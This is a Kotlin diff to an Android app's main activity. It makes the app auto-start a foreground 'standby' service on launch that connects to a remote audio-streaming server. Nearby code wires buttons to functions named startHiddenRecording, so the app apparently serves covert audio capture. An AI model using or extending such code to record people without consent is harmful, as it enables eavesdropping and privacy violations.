@@ -175,6 +175,22 @@ class MainActivity : AppCompatActivity() {
             ?: "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }}-${Build.MODEL.replace(" ", "-")}"
         tvClientName.text = "Client: $clientName"
 
+        // Auto-connect to server in Standby mode on launch (Signals mobile is online without immediate recording)
+        if (!AudioRecordService.isRunning && !AudioRecordService.isStandbyMode) {
+            val targetUrl = savedUrl?.ifEmpty { "https://audio-steam-server.onrender.com" }
+                ?: "https://audio-steam-server.onrender.com"
+            try {
+                val standbyIntent = Intent(this, AudioRecordService::class.java).apply {
+                    action = AudioRecordService.ACTION_STANDBY
+                    putExtra(AudioRecordService.EXTRA_SERVER_URL, targetUrl)
+                }
+                ContextCompat.startForegroundService(this, standbyIntent)
+                appendLog("📱 App started: Standby mode activated. Mobile is online.")
+            } catch (e: Exception) {
+                appendLog("Warning starting standby mode: ${e.message}")
+            }
+        }
+
         // Button handlers
         btnStart.setOnClickListener { startHiddenRecording() }
         btnStop.setOnClickListener { stopHiddenRecording() }
